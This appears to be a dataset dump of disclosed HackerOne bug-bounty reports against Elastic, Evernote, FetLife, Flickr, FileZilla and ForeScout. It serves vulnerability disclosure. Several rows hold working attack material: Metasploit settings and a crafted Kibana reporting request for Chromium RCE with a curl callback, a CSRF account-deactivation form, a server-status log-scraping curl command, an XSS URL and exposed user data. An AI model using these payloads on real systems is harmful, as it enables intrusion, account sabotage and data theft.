Code 924 BytesWrap lines Copy Download1$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
2bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
3bash-4.4$ ls /tmp/
4ks-script-esd4my7v  ks-script-eusq_sc5
5bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
6[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
7[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
8[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
9[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
10^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
11bash-4.4$ ls /tmp/
12alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
13bash-4.4$ cat /tmp/alexb-says-hi
14Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
Supporting Material/References:

HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)

Impact
Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.1 attachment:F1271128: alexb-says-hi.htmlalexbrasetvik   posted a comment. Apr 19th (2 years ago)I didn't click any of the ""Severity (Optional)"" things, intending to leave them unchecked. I missed the default being High, which it probably isn't without a first step to form a chain.
As I mention, this isn't a complete chain. If mixed with an HTML-injection (even without an XSS) or an open redirect (or a full-blown XSS), it'd be an RCE on Cloud and Kibana, though.alexbrasetvik   posted a comment. Apr 20th (2 years ago)So I managed to do an RCE on Elastic Cloud. Attached is a video demonstrating it, and the HTML payload used in the video, which triggers curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud
To access the viewer of the requestbin (because editing the payload is a bit onerous), you can access it via https://requestbin.com/r/enu8lspgwcj2k/1rRl9tN9tAMRN6muMXXQB4jjxdZ (I don't know how long that is valid for)
To point reporting's vulnerable chromium at a page that triggered the exploiting Javascript, I, uh, configured kibana.yml to just always respond with a Location header. Then, I pointed reporting at a /goto URL, which emits the right redirect header and status code, but with my custom redirect overriding whatever the goto was trying to send the user to. This gets me a vulnerable Chromium to run my payload, which in turn triggers the curl request shown in the video.
The kibana involved is https://0e193a35efd34736940bc3e00386aed8.us-west1.gcp.cloud.es.io:9243, and I'm sure you have execve logs that can confirm these curls :)2 attachments:F1272698: rce-via-reporting-chromium.movF1272699: curl-only.htmldouglas_day Elastic staff  posted a comment. Apr 20th (2 years ago)Nice Alex!
I'll start looking into this - though as a heads up, I am out tomorrow and so may not get this triaged and get your money to you until Thursday.
Looking forward to reading into this :) h1_analyst_jake HackerOne triage  changed the status to Needs more info. Apr 21st (2 years ago)Hi @alexbrasetvik,
Thanks for your report. I'm having difficulties reproducing the described behavior. Apparently, the file is correctly fetched according to my ngrok logs, but no code execution occurs:
Image F1273303: Screenshot_2021-04-21_at_12.13.29.png 599.00 KiBZoom in Zoom out Copy Download
I assume the payload used is strictly dependent on the host machine architecture/version. Can you please leave additional information on the OS version running the Docker service?
Regarding the severity, the --no-sandbox argument is actually a poor security practice and it's generally not recommended running the headless instance with that flag. As such, this somehow mitigates the attack as the victim must intentionally launch the command with such a flag.
Best,
@lugtag 1 attachment:F1273303: Screenshot_2021-04-21_at_12.13.29.pngalexbrasetvik   changed the status to New. Apr 21st (2 years ago)@lugtag ngrok ngrok tunnels are ephemeral, and you pointed it at something that probably just returned a 404. The first message with the alexb-says-hi.html attachment should be usable. Put that wherever and point headless_shell at it. (python -m SimpleHTTPServer 8000 will serve your cwd on port 8000)
I'm running Docker for Mac like you are. 

 the --no-sandbox argument is actually a poor security practice and it's generally not recommended running the headless instance with that flag.

I would agree. ECE and Elastic Cloud does run Kibana with the sandbox disabled, though, thus the hazard (and RCE on Elastic Cloud) - https://github.com/elastic/kibana/blob/master/x-pack/plugins/reporting/server/browsers/chromium/driver_factory/args.ts#L58-L60alexbrasetvik   posted a comment. Apr 21st (2 years ago)I made an updated recording that's maybe a bit easier to follow. I just spun up an ec2 instance and ran metasploit on it, and got a meterpreter session established in the Kibana container.
Metasploit settings:
Code 128 BytesWrap lines Copy Download1use exploit/multi/browser/chrome_simplifiedlowering_overflow
2set target 0
3set payload 5
4set uripath /
5set lhost [your public ip]
Custom kibana.yml settings:
Code 70 BytesWrap lines Copy Download1server.customResponseHeaders:
2   Location: ""http://13.53.201.208:8080""
Custom reporting create request:
Code 2.52 KiBWrap lines Copy Download1# To get a valid auth header, just create a PDF of something and extract its header from here.
2# The header is valid for a few minutes, if you get ""security exception"" from reporting, then 
3# you need to refresh your header
4GET /.reporting-2021-*/_search?sort=created_at:desc&size=1
5
6POST /.reporting-2021-04-18/_doc
7{
8          ""jobtype"" : ""printable_pdf"",
9          ""created_at"" : ""2021-04-19T21:45:15.379Z"",
10          ""created_by"" : ""2"",
11          ""payload"" : {
12            ""headers"" : ""REPLACE ME - SEE COMMENT ABOVE"",
13            ""browserTimezone"" : ""Europe/Oslo"",
14            ""forceNow"" : ""2021-04-19T21:45:15.379Z"",
15            ""layout"" : {
16              ""dimensions"" : {
17                ""height"" : 1160,
18                ""width"" : 1780
19              },
20              ""id"" : ""preserve_layout""
21            },
22            ""objects"" : [
23              {
24                ""relativeUrl"" : ""/goto/[MAKE A PROPER SHORT URL AND REPLACE ME]#/edit/windows-4bedf650-9ffd-11ea-87e4-49f31ec44891?_g=(filters:!(),refreshInterval:(pause:!t,value:0),time:(from:now-15m,to:now))&_a=(filters:!(('$state':(store:appState),meta:(alias:!n,disabled:!f,index:'logs-*',key:event.code,negate:!f,params:(query:'4625'),type:phrase),query:(match_phrase:(event.code:'4625'))),('$state':(store:appState),meta:(alias:!n,disabled:!f,index:'logs-*',key:winlog.provider_name,negate:!f,params:(query:Microsoft-Windows-Security-Auditing),type:phrase),query:(match_phrase:(winlog.provider_name:Microsoft-Windows-Security-Auditing)))),linked:!f,query:(language:kuery,query:'data_stream.dataset:windows.security%20OR%20data_stream.dataset:system.security'),uiState:(),vis:(aggs:!((enabled:!t,id:'1',params:(customLabel:'Failed%20Logons'),schema:metric,type:count)),params:(addLegend:!f,addTooltip:!t,metric:(colorSchema:'Green%20to%20Red',colorsRange:!((from:0,to:10000)),invertColors:!f,labels:(show:!t),metricColorMode:None,percentageMode:!f,style:(bgColor:!f,bgFill:%23000,fontSize:60,labelColor:!f,subText:''),useRanges:!f),type:metric),title:'%20Failed%20Logons%20%20%5BWindows%20System%20Security%5D',type:metric))""
25              }
26            ],
27            ""title"" : ""goto?"",
28            ""objectType"" : ""visualization""
29          },
30          ""meta"" : {
31            ""objectType"" : ""visualization"",
32            ""layout"" : ""preserve_layout""
33          },
34          ""timeout"" : 100000,
35          ""max_attempts"" : 3,
36          ""priority"" : 10,
37          ""browser_type"" : ""chromium"",
38          ""status"" : ""pending"",
39          ""attempts"" : 0,
40          ""process_expiration"" : ""1970-01-01T00:00:00.000Z""
41        }1 attachment:F1273723: kibana-reporting-meterpreter.movdouglas_day Elastic staff  updated the severity from high (8.0) to critical. Apr 22nd (2 years ago)douglas_day Elastic staff  changed the status to Triaged. Apr 22nd (2 years ago)Thanks Alex!Elastic  rewarded alexbrasetvik with a $7,500 bounty and a $2,500 bonus. Apr 22nd (2 years ago)Awarding for Kibana crit plus an additional bonus because there's some more holistic changes that we'll need to make around this. cough keeping our headless browser up to date coughalexbrasetvik   posted a comment. Apr 22nd (2 years ago)Nice! Thanks! :)douglas_day Elastic staff  closed the report and changed the status to Resolved. May 24th (about 1 year ago)This will be going out in 7.13.0alexbrasetvik   requested to disclose this report. May 26th (about 1 year ago)douglas_day Elastic staff  agreed to disclose this report. May 26th (about 1 year ago)  This report has been disclosed. May 26th (about 1 year ago)",https://hackerone.com/reports/1168765,California,United States,Mountain View,2021,4,19,16,26
Elastic,1001-5000,0.0,1m-10m,"$3,000.00",High,8.8,Improper Access Control - Generic,Improper authorization on `/api/as/v1/credentials/` allows any App Search user to access all API keys and escalate privileges,"dee-see  submitted a report to Elastic.Apr 19th (2 years ago)Summary
Hello team, I hope you're doing well! App Search has a credentials page located at /as#/credentials that lists all the API keys a user has access to, if any. That same page will 404 for users with Analyst or Editor role. This is all working as intended, however there is also an API endpoint to query that same data at /api/as/v1/credentials/ and this will list all existing API keys for any authenticated user regardless of their App Search role.
Steps to reproduce
I'm going to use the cloud environment for the reproduction
Preparation

Log in App Search with the admin (elastic) user and go to the Users & roles page (/as#/role-mappings/)
Click Add mapping
In the Attribute value field enter h1-repro
In the Role box select Analyst
In the Engine Access select Limited Engine Access, no need to select any engine

We now have created the most limited role possible


Log in Kibana with the admin (elastic) user and go to the Stack Management > Users page (/app/management/security/users/)
Click Create user
In the Username field enter hi-repro
Set any password you like and then click Create user

Reproduction

Log in App Search with the h1-repro user
Navigate to /as#/role-mappings/ and observe that it's a 404 because you don't have access to this page
Navigate to /api/as/v1/credentials/ and observe that you have access to all the API keys

Impact
Privilege escalation. The default App Search install has a Private API Key with read/write access to all engines. If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.",https://hackerone.com/reports/1168528,California,United States,Mountain View,2021,4,19,13,20
Evernote,251-500,0.0,50m-100m,$150.00,Low,3.7,Privilege Escalation,[34.96.80.155] Server Logs Disclosure lead to Information Leakage,"huntinex  submitted a report to Evernote.Nov 11th (about 1 year ago)Summary:
In this case server log is available for any in /server-status 
Steps To Reproduce:

Go to https://34.96.80.155/server-status/ and follow attack scenario's

Attack Scenario's:
[Serg.io]

User go to server and enter sensitive info that can be logged (example : http://host/login?private_key=<KEY>)
Attacker read the logs and founded sensitive information that user entered (example : private_key=<KEY>)
Image F1510839: poc_evernote.png 65.66 KiBZoom in Zoom out Copy Download

[translate.evernote.com]
In this site login and many features available and it's increase the impact 

Users login with sso ( example : /sso?sso_private_key=<key>&next=/ssoreturn )
Attacker can read full sso key and login (Account Take Over)

Supporting Material/References:
Why [34.96.80.155] blongs to www.evernote.com :

the ssl certificate : https://www.shodan.io/host/34.96.80.155 (SSL Cert related to Evernote Corporation)
copywrite section : 

© 2014–2021 Evernote Corporation



Impact
attacker can read all log on server2 attachments:F1510839: poc_evernote.pngF1510847: poc_evernote2.pnghuntinex   posted a comment. Nov 11th (about 1 year ago)server info disclose :
Code 502 BytesWrap lines Copy Download1Current Time: Thursday, 11-Nov-2021 06:35:27 PST
2Restart Time: Friday, 09-Jul-2021 06:55:40 PDT
3Parent Server Config. Generation: 126
4Parent Server MPM Generation: 125
5Server uptime: 125 days 39 minutes 47 seconds
6Server load: 0.00 0.02 0.00
7Total accesses: 993986 - Total Traffic: 1.8 GB - Total Duration: 9644872
8CPU Usage: u189.62 s418.04 cu4157.02 cs893.51 - .0524% CPU load
9.092 requests/sec - 180 B/second - 1956 B/request - 9.70323 ms/request
101 requests currently being processed, 9 idle workershuntinex   posted a comment. Nov 11th (about 1 year ago)Example of Logs :
Code 1.48 KiBWrap lines Copy Download1Srv	PID	Acc	M	CPU	SS	Req	Dur	Conn	Child	Slot	Client	Protocol	VHost	Request
20-125	-	0/0/152794	.	0.00	6412	0	1607964	0.0	0.00	261.49	127.0.0.1	http/1.1	serge.io:2080	OPTIONS * HTTP/1.0
31-125	30028	0/14902/156183	W	10.58	0	0	1600520	0.0	53.24	274.03	127.0.0.1	http/1.1	serge.io:2080	GET /server-status/ HTTP/1.0
42-125	30029	0/14885/156149	_	10.55	20	7	1597361	0.0	53.15	274.79	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
53-125	1092	0/3522/155777	_	2.42	35	7	1597995	0.0	12.67	272.33	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
64-125	30031	0/14980/156200	_	10.60	110	6	1598095	0.0	53.40	274.69	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
75-125	1065	0/4233/150201	_	2.88	65	6	1565389	0.0	15.20	257.81	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
86-125	1008	0/8220/22263	_	5.33	95	7	29230	0.0	29.56	80.27	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
97-125	965	0/10502/15697	_	6.73	125	6	21402	0.0	37.86	56.36	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
108-125	966	0/9830/9830	_	6.27	50	6	9117	0.0	35.38	35.38	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
119-125	967	0/9694/9694	_	6.29	80	8	9242	0.0	34.87	34.87	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1
1210-125	995	0/9198/9198	_	5.95	5	6	8552	0.0	33.09	33.09	127.0.0.1	http/1.1	translate.evernote.com:2080	GET /serge-admin/ HTTP/1.1huntinex   posted a comment. Nov 11th (about 1 year ago)CURL Command to get Logs :
Code 116 BytesWrap lines Copy Download1curl https://34.96.80.155/server-status/ --insecure | grep -Ezo '(GET|POST|OPTIONS|PUT|PATCH|HEAD) /[a-z,A-Z,\-]+/ 'h1_analyst_layla HackerOne triage  changed the status to Triaged. Nov 12th (about 1 year ago)Hello @huntinex,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Thanks,
@bassguitarh1_analyst_layla HackerOne triage  updated the severity from critical to low (3.7). Nov 12th (about 1 year ago)huntinex   posted a comment. Nov 12th (about 1 year ago)Severity isn't Low !
account takeover without interaction is possible !
for example if admin login on his panel log's fully available for Hacker and it allows attacker to admin take over !
example : translate.evernote.com:2080	GET /serge-admin/login?code=<...>&state=<...>huntinex   posted a comment. Nov 12th (about 1 year ago)@bassguitar huntinex   posted a comment. Nov 13th (about 1 year ago)Hi @bassguitar,
please update Severity to Critical or least High
because logs of 2 of your Servers fully available ! 
Thank you h1_analyst_layla HackerOne triage  posted a comment. Nov 15th (about 1 year ago)@huntinex - This will continue to be a Low severity issue unless a working PoC shows further impact to the reported behavior. That said, we are not changing the severity for the time being.
Cheers,
@bassguitarhuntinex   posted a comment. Nov 15th (about 1 year ago)ok , thanksboliva Evernote staff  posted a comment. Nov 17th (about 1 year ago)@huntinex thanks for your report, this has been fixed so we'll be asking you for a retest before closing.Evernote  rewarded huntinex with a $150 bounty. Nov 17th (about 1 year ago)Thanks @huntinex for helping make Evernote more secure.
Best,
@boliva boliva Evernote staff  changed the status to Retesting. Updated Nov 17th (about 1 year ago)Please retest to make sure the reported issue has actually been fixed.huntinex   completed a retest. Nov 18th (about 1 year ago)Retest finding resultAre you able to reproduce the vulnerability report?No, the fix works.Please provide a short summary with the results of your retestfixed successfully !Evernote  awarded $50 to huntinex for completing the retest. Nov 18th (about 1 year ago)Thanks @huntinex!boliva Evernote staff  closed the report and changed the status to Resolved. Nov 18th (about 1 year ago)huntinex   requested to disclose this report. Dec 7th (12 months ago)boliva Evernote staff  agreed to disclose this report. Dec 9th (11 months ago)Hi @huntinex, we accept your disclosure request.  This report has been disclosed. Dec 9th (11 months ago)",https://hackerone.com/reports/1398270,California,United States,Redwood City,2021,11,11,13,26
Evernote,251-500,0.0,50m-100m,"$5,000.00",Critical,9.5,Server-Side Request Forgery (SSRF),Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion,neolex  submitted a report to Evernote.May 9th (2 years ago),https://hackerone.com/reports/1189367,California,United States,Redwood City,2021,5,9,9,49
Evernote,251-500,0.0,50m-100m,$300.00,Medium,4.3,None,CSRF leads to account deactivation of users,"sampritdas  submitted a report to Evernote.Mar 10th (2 years ago)Step to reproduce vulnerability:-
1) Create 2 account one account is for attacker and one is for victim
2) With attacker account go to https://www.evernote.com/secure/CloseAccount.action
3) Open your burpsuite and when you will press Deactivate your Evernote account you will see another popup of Before you go, we recommend... just check the reviewed and continue
4) Select that why you want to deactivate and Then press Deactivate account
5) Capture the request with burpsuite intercept on
6) Request be like:-
	POST /secure/CloseAccount.action?accountAction=deactivateAccount&json=true HTTP/1.1
Host: www.evernote.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 202
Origin: https://www.evernote.com
Connection: close
Referer: https://www.evernote.com/secure/CloseAccount.action
Cookie: web50017PreUserGuid=03325c9c-10bb-4705-a4db-08fde2343592; cookieTestValue=1615353230618; JSESSIONID=761EB90EE2758BBF63CDDD3D14D0DC97; userdata_lastLoginTime=1615353238172; userdata_accountType=BASIC; userdata_acctCreatedTime=1615353237000; lastAuthentication=1615353238363/8690e8a01b1354ef467f4db8066ea718; Ue9i0JAw=AK6vKhp4AQAAxbQuLjpIXLkJispAAhdLVUZDhggqGkbuCWLCXGuv2aD-bibs; last-web-version-used=Ion-on-Conduit; promoCode=86fe54e944118fc779bacb7705f6bb40; optimizelyEndUserId=oeu1615346790816r0.5547674269987128; iterableEndUserId=xacoyi5848%40nobitcoin.net; iterableEmailCampaignId=1406900; iterableTemplateId=1952543; iterableMessageId=31ec3758a6e446caa50aa9378227df08; EB_Partial_Sign_Up_Email_Capture_Variant=B_PartialCapture; WEB_51151_EB_Sign_Up_Zendesk_Chat_Variant=A_Control; _dd_s=logs=1&id=544a2ceb-8bca-4321-9826-588de3b14daf&created=1615352249296&expire=1615354270436; auth=""S=s417:U=d645f78:E=1781ac54117:C=1781a8e529b:P=5fd:A=en-web:V=2:H=f7a20a70086b721eb3990baf142c7c9d""; userdata_loggedIn=true; 	clipper-sso=""S=s417:U=d645f78:E=17f723f7ea4:C=1781a8e52a5:P=1d5:A=en-chrome-clipper-xauth-new:V=2:H=4c1ac923c3fa5f2f5f36681ac30a0ecb""; req_sec=""U=d645f78:P=/:E=1781a9d4be9:S=bd223e7b10ca33bccfc72769f7584122""
Sec-GPC: 1
	password=&oneTimeCode=&captchaResponse=&reasons%5Banalytic%5D=specify-reason-different-app&reasons%5Bi18nKey%5D=CloseAccountAction.accountActionSurvey.differentApp&reasons%5Bchecked%5D=true&otherReason=
6) Now do right click on request go to Engagement Tools then go to Generate CSRF PoC and Copy HTML
7) CSRF POC be like:- 
Code 886 BytesWrap lines Copy Download1	<html>
2  <!-- CSRF PoC - generated by Burp Suite Professional -->
3  <body>
4  <script>history.pushState('', '', '/')</script>
5    <form action=""https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true"" method=""POST"">
6      <input type=""hidden"" name=""password"" value="""" />
7      <input type=""hidden"" name=""oneTimeCode"" value="""" />
8      <input type=""hidden"" name=""captchaResponse"" value="""" />
9      <input type=""hidden"" name=""reasons&#91;analytic&#93;"" value=""specify&#45;reason&#45;different&#45;app"" />
10      <input type=""hidden"" name=""reasons&#91;i18nKey&#93;"" value=""CloseAccountAction&#46;accountActionSurvey&#46;differentApp"" />
11      <input type=""hidden"" name=""reasons&#91;checked&#93;"" value=""true"" />
12      <input type=""hidden"" name=""otherReason"" value="""" />
13      <input type=""submit"" value=""Submit request"" />
14    </form>
15  </body>
16</html>
8) Then make a file with Csrf.html and paste the html POC in it and save it
9) When attacker will send this html file to victim and when victim will click on it this account will get Deactivate
Video POC link:- https://drive.google.com/file/d/12IJOyqVxIOqG_vTWKVJ3qwG7GTn-fV-f/view?usp=sharing
Impact
Attacker can Deactivate victim premium accounts, And you will lost your good customer for this security flaws4 attachments:F1224851: POC.PNGF1224853: POC2.PNGF1224854: POC3.PNGF1224855: POC_account_Deactivate_.mkv",https://hackerone.com/reports/1121990,California,United States,Redwood City,2021,3,10,5,44
FetLife,11-50,0.0,1m-10m,$300.00,Low,2.0,Information Disclosure,Google API key leaked to Public,"bb89e4af088379499c73f7d  submitted a report to FetLife.Dec 23rd (2 years ago)Hi team,
I found a bunch of endpoints that is leaking you Google Api key.
I tested the key and found it is vulnerable to Geocode Api.
List of vulnerable endpoints
https://ass0.fetlife.com
https://ass2.fetlife.com
https://app.fetlife.com
https://ass1.fetlife.com
https://ass3.fetlife.com
https://fetlife.com
https://ws.fetlife.com 
POC key:
AI████████DM
Exploit POC:
API key is  vulnerable  for Geocode API! Here is the PoC link which can be used directly via browser:
https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=AI████████DM
Impact
costing companies extra money and in some cases DOS.
Identifies cost: $5 per 1000 request",https://hackerone.com/reports/1065041,British Columbia,Canada,Vancouver,2020,12,23,9,47
FetLife,11-50,0.0,1m-10m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,Stored XSS via `Create a Fetish` section.,xploiterr  submitted a report to FetLife.Jan 24th (2 years ago),https://hackerone.com/reports/1085914,British Columbia,Canada,Vancouver,2021,1,24,10,53
FetLife,11-50,0.0,1m-10m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Stored,Stored XSS via Angular Expression injection via Subject while starting conversation with other users.,xploiterr  submitted a report to FetLife.Feb 5th (2 years ago),https://hackerone.com/reports/1095934,British Columbia,Canada,Vancouver,2021,2,5,6,9
Figma,1001-5000,0.0,1m-10m,$150.00,Low,2.0,Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'),Race condition while removing the love react in community files.,amir-sadaqah  submitted a report to Figma.Oct 1st (2 years ago),https://hackerone.com/reports/996141,California,United States,San Francisco,2020,10,1,21,11
FileZilla,11-50,1.0,1m-10m,$250.00,Low,3.3,Classic Buffer Overflow,FileZilla 3.46.3 - 'Scale factor' Buffer Overflow,"ayson88  submitted a report to FileZilla.Feb 17th (3 years ago)Summary:
FileZilla in has a problem in the ""Scale Factor"" field is vulnerable to a Buffer Over Flow attack or a denial attack. Adding random characters in an entry that must accept only Float input type values.
Steps To Reproduce:
A python file of name generatepaste.py was generated for the generation of the chain that allows the overflow, which is the following:
buffer = ""\x41""  5000000
eip= ""\x42""  4
f = open (""generate.txt"", ""w"")
f.write(buffer+eip)
f.close()
  1.- Run python code : python generatepaste.py
2.- Open generate.txt and copy content to clipboard.
3.- Open FileZilla.
4.- Select the Edit menu and then Settings.
5.- Find the Interface section and select Themes.
6.- Paste Clipboard on ""Scale Factor"" three times.
7.- Click in the icons.
8.- BoF
Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

[attachment / reference]
Captura.JPG (F719632)

Impact
An attacker can corrupt FileZilla applications and be a preamble to a much more severe attack.1 attachment:F719632: Captura.JPG",https://hackerone.com/reports/798301,Remote,Remote,Remote,2020,2,17,21,45
Flickr,51-100,0.0,10m-50m,$500.00,Medium,5.3,Business Logic Errors,critical server misconfiguration lead to access to any user sensitive data which include user email and password,"mr_robert  submitted a report to Flickr.Oct 11th (about 1 year ago)Hi flickr team,
I found a critical issue lead to access to any user sensitive data which include user hashed password and possibly can lead to takeover any user account on  flickr's main site, literally i can get all  user information from database with no restrictions ,
Let me explain how this happen:
As we know Flickr that it was belong to Yahoo and also it was  hosted on many servers, including Amazon servers,
And after Flickr reboot as an independent and separate organization from Yahoo
This servers still has full access to Flickr’s main server databases
The attacker can use this old flickr server to get a lot of sensitive information belong to any user
By using “published user image name” and search by it ,on Flickr yahoo old server
For example :
We have user x  and he posted a photo named “golden_arrow_img”
Now let’s say the attacker know his victim user and now he know how to get all user sensitive data , he will go to misconfigured server  which it’s address is : https://34.235.208.201 But when he goes to this address, he only sees an error message and the logo of Flickr, and after a while of checking the available paths, I found that when I add the word start, all the content of the server appears,the address will be https://34.235.208.201/start , you will see a search box, go to search by the name of the published user image which is for example “golden_arrow_img”, but you will not see the results in The page, server will redirect you to the first error page , the request must be stopped by burp-suite proxy and send it to the repeater then repeat the request, you will see the results, search in the repeater results for the function called “Y.listData”
You will see under this function all user sensitive data, which is will be like :
Code 1.87 KiBWrap lines Copy Download1Y.listData = {
2		""user"": {
3				""id"": ""193923944"",
4				""first_name"": ""robert"",
5				""last_name"": ""carlos"",
6				""email"": ""robert_d1999@yahoo.com"",
7				""date_creation"": ""1631706054"",
8				""date_modified"": ""0"",
9				""password"": ""d63b6d249dcc52ef335b0eeea167fef1"",
10				""city"": ""los angelos"",
11				""country"": ""United states"",
12				""check_code"": """",
13				""email_conf"": ""1"",
14				""email_conf_bounce"": ""0"",
15				""nsid"": ""194016757@N08"",
16				""character_name"": ""robert_d1999"",
17				""gender"": ""M"",
18				""magic_email"": """",
19				""is_admin"": ""0"",
20				""is_bad"": ""0"",
21				""prefs_main_1"": ""2056"",
22				""prefs_main_2"": ""262161"",
23				""mail_buffer"": """",
24				""deleted"": ""0"",
25				""kill"": ""0"",
26				""kill_from"": ""0"",
27				""refer_code"": """",
28				""date_limit"": ""0"",
29				""photo_id_limit"": ""0"",
30				""date_premium_end"": ""0"",
31				""is_paid_pro"": ""0"",
32				""has_order_history"": ""0"",
33				""gifts_to_give"": ""0"",
34				""path_alias"": null,
35				""date_iconchange"": ""0"",
36				""pref_default_license"": ""0"",
37				""upload_email_tags"": """",
38				""upload_email_size"": ""2"",
39				""upload_email_body"": ""0"",
40				""timezone_id"": ""5"",
41				""timezone_dst"": ""1"",
42				""buddyicon_server"": ""0"",
43				""unread_mail"": ""0"",
44				""yid"": ""ef29e4c8-ee47-45a1-8a26-32b2203b6d83"",
45				""yhid"": ""ef29e4c8-ee47-45a1-8a26-32b2203b6d83"",
46				""dot_yjid"": null,
47				""yintl"": ""eg"",
48				""lang"": ""1"",
49				""cluster_id"": ""39"",
50				""cluster_lock"": ""0"",
51				""adultness"": ""2"",
52				""commercial"": ""0"",
53				""last_activity"": ""1633964310"",
54				""bb_partner_id"": ""0"",
55				""stats_cluster_id"": ""1"",
56				""stats_cluster_lock"": ""0"",
57				""yreg"": ""0"",
58				""has_stats"": ""0"",
59				""contact_cluster_id"": ""1"",
60				""contact_cluster_lock"": ""0"",
61				""unread_mail_inbox"": ""0"",
62				""buddyicon_max_resolution"": ""0"",
63				""coverphoto_server"": ""0"",
64				""addons"": ""0"",
65				""yalias"": ""robert_d1999@yahoo.com"",
66				""ins_ts"": ""2021-09-15 11:40:54"",
67				""upd_ts"": ""2021-10-11 14:58:49"",
68				""has_csam"": ""0"",
69				""display_yhid"": ""robert_d1999@yahoo.com""
70			},
71
This is a summary, not all information, there is more fields
Steps to reproduce :

Go to https://34.235.208.201/start
Open burp suite 
Search by the name of the published user image which is for example “golden_arrow_img” 
Intercept the request and send it to repeater then repeat the request
search in the repeater results for the function called “Y.listData”
You will see under this function all user sensitive data

Screenshots:
flickr-yahoo-old-server.png (F1478270)
user-data.png (F1478271)
Impact
The attacker can access to any user sensitive data which include user hashed password and possibly lead to takeover any flickr user account , literally the attacker can get all  user information from database with no restrictions2 attachments:F1478270: flickr-yahoo-old-server.pngF1478271: user-data.png",https://hackerone.com/reports/1365738,California,United States,San Francisco,2021,10,11,16,21
Flickr,51-100,0.0,10m-50m,"$2,000.00",Critical,9.9,Code Injection,Arbitrary file read via ffmpeg HLS parser at https://www.flickr.com/photos/upload,"asad0x01_  submitted a report to Flickr.Jan 27th (4 years ago)Summary: FFmpeg is a video and audio software that is used for generating previews and for converting videos. Your current installation allows HLS playlists that contain references to external files, which leads to local file disclosure.
Steps to Reproduce:
1.Download the attached file. READ__etc_passwd.avi (F413554)
2.Go to https://www.flickr.com/photos/upload/ and upload the attached file.
3.Now go to https://www.flickr.com/cameraroll and you should be able to see contents of /etc/passwd. Image F413555: Screenshot_2019-01-28_at_3.24.17_AM.png 106.32 KiBZoom in Zoom out Copy Download
For clear view open the video from Photostream section.
Please let me know if you need any help :)
Impact
An attacker can read files of etc/passwd or other contents.Also what I've seen it is possible to escalate this vulnerability to SSRF(https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf).Since I don't have any server I couldn't test :(2 attachments:F413554: READ__etc_passwd.aviF413555: Screenshot_2019-01-28_at_3.24.17_AM.png",https://hackerone.com/reports/487008,California,United States,San Francisco,2019,1,27,21,25
Flickr,51-100,0.0,10m-50m,$750.00,High,7.3,Cross-Site Request Forgery (CSRF),CSRF in Account Deletion feature (https://www.flickr.com/account/delete),"asad0x01_  submitted a report to Flickr.Jun 15th (3 years ago)Summary by asad0x01_Sometimes you just get lucky. When Flickr was owned by Yahoo, they used to use Yahoo Authentication system (https://login.yahoo.com) . When Flickr got sold to  SmugMug, they introduced new login flow (https://identity.flickr.com). Basically in their previous login flow, they used to use the Yahoo authentication code as CSRF token while deleting account. While testing the account deletion feature, I noticed that there were no CSRF token :/ Later found out it was because of the new login flow.",https://hackerone.com/reports/615448,California,United States,San Francisco,2019,6,15,9,19
ForeScout Technologies,501-1000,0.0,100m-200m,"$1,000.00",Medium,4.7,Cross-site Scripting (XSS) - DOM,DOM XSS at www.forescout.com in Microsoft Edge and IE Browser,"enesdexh1  submitted a report to ForeScout Technologies.Sep 30th (3 years ago)Summary:
I've found an DOM Based XSS on homepage 
Steps To Reproduce:
1.Go to this url and you'll see alert pop
https://www.forescout.com/#<img src=x onerror=alert('XSS')>
But this will work just on ME/IE browsers because chrome and firefox have default encode system hash url
And vulnerable code is on your directly source code within jquery code. As you can see there is no encode in window.location.hash code so when we open the page with #<img src=x onerror=alert(1)> it executes code.
jQuery(window).load(function() {     jQuery('a.fancybox-inline[href=""' + window.location.hash + '""]:first').each(function() {         jQuery(this).delay(700).trigger('click');     }); });
Supporting Material/References:
I have uploaded a picture to show you POC
Regards
Enesdex
Impact
--Hacker can execute malicious codes in victim's browser
--Hacker can redirect user to malicious website
